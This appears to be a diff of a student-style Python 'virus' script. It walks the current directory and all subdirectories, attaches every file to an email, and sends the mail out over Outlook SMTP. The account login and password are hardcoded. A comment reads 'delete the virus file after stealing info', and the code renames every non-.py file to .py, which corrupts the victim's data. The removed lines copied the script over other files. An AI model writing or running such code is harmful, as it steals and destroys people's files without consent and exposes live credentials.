@@ -1,5 +1,5 @@
 
-"""Send the contents of a directory and its subdirectories as a MIME message."""
+__author__ = 'Xue Wei Fan'
 
 import os
 import sys
@@ -21,28 +21,29 @@ from email.mime.text import MIMEText
 def main():
       
     directory = os.getcwd()   #get current working directory
-    if not directory:
-        directory = '.'
+    if not directory:         #check if current directory exists just in case os.getcwd() fail
+        directory = '.'       #current directory, you can just set directory = '.' in the beginning if you want
         
         
-    # Create the enclosing (outer) message
-    outer = MIMEMultipart()
-    sender = "hackerfxw@gmail.com"
-    recipients = "josephxwf@gmail.com"
-    outer['Subject'] = 'Contents of directory %s' % os.path.abspath(directory)
-    outer['From'] = sender
-    outer['To'] = recipients
-    outer.preamble = 'You will not see this in a MIME-aware mail reader.\n'
+    # Create the enclosing (msg) message
+    msg = MIMEMultipart()
+    sender_addr = "hackerfxw@outlook.com"
+    recipient_addr = " Please put the email address you want the info sent to here"
+    msg['Subject'] = 'Contents of directory %s' % os.path.abspath(directory)
+    msg['From'] = sender_addr
+    msg['To'] = recipient_addr
+    msg.preamble = 'You will not see this in a MIME-aware mail reader.\n'
     
-  
-    for dirpath, subdirs, files in os.walk(directory):
+    
+    for dirpath, subdirs, files in os.walk(directory):  # this will go through each subdirectories in current directory
+      #print dirpath  # this will print each subdirectories
+      #print subdirs
+      for filename in files: #os.listdir(directory):
       
-      for filename in files:#os.listdir(directory):
+        path = os.path.join(dirpath, filename) # get absolute path for each file in directory or subdirectories
         
-        path = os.path.join(directory, filename)     # get absolute path
+
         
-        if not os.path.isfile(path):
-            continue
         # Guess the content type based on the file's extension.  Encoding
         # will be ignored, although we should check for simple things like
         # gzip'd or compressed files.
@@ -55,51 +56,56 @@ def main():
         
         
         if maintype == 'text':
-            with open(path) as fp:
+            with open(path,"r") as fp:
                 # Note: we should handle calculating the charset
-                msg = MIMEText(fp.read(), _subtype=subtype)
+                msgbody = MIMEText(fp.read(), _subtype=subtype)
                 
         elif maintype == 'image':
             with open(path, 'rb') as fp:
-                msg = MIMEImage(fp.read(), _subtype=subtype)
+                msgbody = MIMEImage(fp.read(), _subtype=subtype)
         elif maintype == 'audio':
             with open(path, 'rb') as fp:
-                msg = MIMEAudio(fp.read(), _subtype=subtype)
+                msgbody = MIMEAudio(fp.read(), _subtype=subtype)
         else:
             with open(path, 'rb') as fp:
-                msg = MIMEBase(maintype, subtype)
-                msg.set_payload(fp.read())
+                msgbody = MIMEBase(maintype, subtype)
+                msgbody.set_payload(fp.read())
             # Encode the payload using Base64
-            encoders.encode_base64(msg)
+            encoders.encode_base64(msgbody)
             
      
         # Set the filename parameter
-        msg.add_header('Content-Disposition', 'attachment', filename=filename)
-        outer.attach(msg)
+        msgbody.add_header('Content-Disposition', 'attachment', filename=filename) # send file as attachment with its name
+        msg.attach(msgbody)  # add each file in current dir and subdirectories to MIMEMultipart() for email later
         
-        #separate name and extension of files
-        base = os.path.splitext(path)[0]         
-        extention = os.path.splitext(path)[1]
-    
-        if filename !="proj1.py":
-        
-            shutil.copy("proj1.py",path) # use shutil.copy("assignment5.py","fp") will get extra file
-            
+        # delete the virus file after stealing info
+        if filename == "virus.py":
+        #shutil.copy("proj1.py",dirpath) # copy file to another directory dirpath
+           #print path
+           os.remove(path) 
+
+        #separate name and extension of current file
+        filename = os.path.splitext(path)[0]          # get the file name
+        extention = os.path.splitext(path)[1]          #get the file extention
+     
+        # change the file extention to .py
         if extention != ".py":
-           os.rename(path, base+".py")
+           os.rename(path, filename+".py")   
           
         
     # Now send or store the message
-    composed = outer.as_string()
-    print(path)
+    messages = msg.as_string()
+    #print(path)
     # connect to server 
-    server = smtplib.SMTP('smtp.gmail.com', 587)
+    #server = smtplib.SMTP('smtp.gmail.com', 587) #(Note: if you use this approach with Gmail you'll have to turn
+    #on the "less secure apps" option in Gmail
+    server = smtplib.SMTP('smtp-mail.outlook.com', '587')
     server.ehlo()
     server.starttls()
     server.ehlo()
-    server.login("hackerfxw", "hackerfxw123")
+    server.login('hackerfxw@outlook.com', 'xueweifan123')
     # send mail
-    server.sendmail(sender, recipients, composed)
+    server.sendmail(sender_addr, recipient_addr, messages)
     server.quit()
     
     
